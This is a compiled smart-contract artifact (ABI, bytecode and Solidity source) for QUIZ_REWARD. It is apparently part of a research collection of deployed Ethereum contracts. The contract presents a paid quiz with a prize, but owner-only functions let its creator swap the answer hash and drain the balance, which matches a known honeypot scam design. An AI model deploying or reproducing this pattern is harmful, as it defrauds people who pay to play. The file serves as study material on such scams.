{
  "contractName": "QUIZ_REWARD",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Q",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "resp",
          "type": "string"
        }
      ],
      "name": "PlayQuiz",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "q",
          "type": "string"
        },
        {
          "name": "resp",
          "type": "string"
        }
      ],
      "name": "Config",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Stop",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "q",
          "type": "string"
        },
        {
          "name": "respHash",
          "type": "bytes32"
        }
      ],
      "name": "New",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "a",
          "type": "address"
        }
      ],
      "name": "Sender",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061080c806100206000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063122b97361461007a578063bedf0f4a1461011c578063c833d86314610126578063d6558c3e14610182578063e493ef8c146101c5578063ed8df16414610255575b005b61011a600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506102bf565b005b61012461039b565b005b610180600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610457565b005b34801561018e57600080fd5b506101c3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061057b565b005b3480156101d157600080fd5b506101da61061b565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561021a5780820151818401526020810190506101ff565b50505050905090810190601f1680156102475780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102bd600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929080356000191690602001909291905050506106b9565b005b600060010260025460001916141561039757806040518082805190602001908083835b60208310151561030757805182526020820191506020810190506020830392506102e2565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060028160001916905550816000908051906020019061035492919061073b565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156103f757600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610454573d6000803e3d6000fd5b50565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561049157600080fd5b806040518082805190602001908083835b6020831015156104c757805182526020820191506020810190506020830392506104a2565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060001916600254600019161480156105145750670de0b6b3a76400003410155b15610578573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610576573d6000803e3d6000fd5b505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156105d757600080fd5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106b15780601f10610686576101008083540402835291602001916106b1565b820191906000526020600020905b81548152906001019060200180831161069457829003601f168201915b505050505081565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561071557600080fd5b816000908051906020019061072b92919061073b565b5080600281600019169055505050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061077c57805160ff19168380011785556107aa565b828001600101855582156107aa579182015b828111156107a957825182559160200191906001019061078e565b5b5090506107b791906107bb565b5090565b6107dd91905b808211156107d95760008160009055506001016107c1565b5090565b905600a165627a7a723058201c77f3d2f9ca3ba23f8eca915941fc809193fe63c6f59cfb1c43fa53a64f4dbc0029",
  "source": "\n\ncontract QUIZ_REWARD\n{\n    string public Q;\n    address questionSender;\n    bytes32 responseHash;\n\n    function() public payable{}\n\n    function PlayQuiz(string resp) public payable {\n        require(msg.sender == tx.origin);\n        if (responseHash == keccak256(resp) && msg.value >= 1 ether) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    function Config(string q, string resp) public payable {\n        if (responseHash == 0x0) {\n            responseHash = keccak256(resp);\n            Q = q;\n            questionSender = msg.sender;\n        }\n    }\n    \n    function Stop() public payable {\n       require(msg.sender == questionSender);\n       msg.sender.transfer(address(this).balance);\n    }\n    \n    function New(string q, bytes32 respHash) public payable {\n        require(msg.sender == questionSender);\n        Q = q;\n        responseHash = respHash;\n    }\n    \n    function Sender(address a) {\n        require(msg.sender == questionSender);\n        questionSender = a;\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x6197e674d1cfa8040b34a82e40d0494ebe5b8d67/contracts/0x6197e674d1cfa8040b34a82e40d0494ebe5b8d67.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:55:43.003Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}